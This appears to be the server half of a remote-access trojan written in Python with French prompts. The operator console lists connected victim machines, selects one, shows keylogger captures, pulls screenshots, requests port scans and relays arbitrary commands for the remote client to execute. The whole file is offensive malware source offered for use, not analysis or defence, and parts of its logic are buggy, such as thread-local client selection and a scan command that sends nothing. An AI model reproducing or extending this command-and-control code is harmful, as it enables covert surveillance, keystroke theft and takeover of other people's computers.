import os
import socket
import threading
from threading import Thread

ip_address = '0.0.0.0'
port_number = 1234
keylog_file = "keylog.txt"

active_connections = {}
lock = threading.Lock()

selected_client = None

def handle_connection(connection, address):
    """"Gère une connexion client."""
    try:
        connection.send(b"ID")
        client_id = connection.recv(1024).decode()
        if not client_id:
            client_id = f"{address[0]}:{address[1]}"
        with lock:
            active_connections[client_id] = connection
        print(f"[+] Client connecté : {client_id}")

        help_text = """
        Commandes disponibles:
        - list : Liste les machines connectées.
        - select <machine_id> : Sélectionne une machine cible.
        - keylog : Affiche les frappes enregistrées par le keylogger (sur la machine sélectionnée).
        - screenshot : Prend une capture d'écran (sur la machine sélectionnée).
        - scan <start_port> <end_port> : Effectue un scan des ports dans la plage spécifiée (sur la machine sélectionnée).
        - exit : Ferme la connexion avec le client.
        - help : Affiche cette aide.
        """

        while True:
            command = input("Entrer 'help' pour afficher les commandes disponibles ou 'exit' pour quitter : ")

            if command.lower() == 'exit':
                connection.send(b'quit')
                break

            elif command.lower() == 'help':
                print(help_text)
                continue

            elif command.lower() == "list":
                with lock:
                    print("Machines connectées :")
                    for i, cid in enumerate(active_connections.keys(), 1):
                        print(f"{i}. {cid}")
                continue


            elif command.startswith('select'):
                _, target_id = command.split(maxsplit=1)

                with lock:
                    if target_id in active_connections:
                        selected_client = target_id
                        print(f"Machine sélectionnée : {target_id}")
                    else:
                        print("Erreur : Machine introuvable.")
                continue

            elif selected_client:
                connection = active_connections[selected_client]
                if command.lower() == 'keylog':
                    try:
                        with open(f"keylog_{client_id}", "r") as keylog:
                            print(f"Contenu du Keylogger :\n{keylog.read()}")
                    except FileNotFoundError:
                        print("Aucun fichier keylog trouvé.")

                elif command.lower() == 'screenshot':
                    connection.send(command.encode())
                    img_size = int(connection.recv(1024).decode())
                    connection.send(b'OK')
                    img_data = b''
                    while len(img_data) < img_size:
                        packet = connection.recv(4096)
                        if not packet:
                            break
                        img_data += packet

                    filename = f"screen_{client_id}_{len(os.listdir('.')) + 1}.png"
                    with open(filename, "wb") as f:
                        f.write(img_data)
                    print(f"Capture sauvegardée : {filename}")
                    continue

                elif command.startswith("scan"):
                    print("Scan en cours...")
                    response = connection.recv(4096).decode()
                    print(f"Résultat du scan pour {client_id} :\n{response}")
                    continue

                else:
                    connection.send(command.encode())
                    response = connection.recv(4096).decode()
                    print(f"Réponse de {client_id} :\n{response}")
            else:
                print("Erreur : Aucune machine sélectionnée.")

    except Exception as e:
            print(f"Erreur avec {address} : {e}")
    finally:
        with lock:
            del active_connections[client_id]
        connection.close()
        print(f"[-] Connexion fermée avec {client_id}")


    connection.close()

def start_server():
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.bind((ip_address, port_number))
    ss.listen(5)
    print(f"Serveur en écoute sur {ip_address}:{port_number}")

    while True:
        connection, address = ss.accept()
        print(f"Nouvelle connexion de {address}")

        thread = threading.Thread(target=handle_connection, args=(connection, address), daemon=True)
        thread.start()

if __name__ == "__main__":
    start_server()
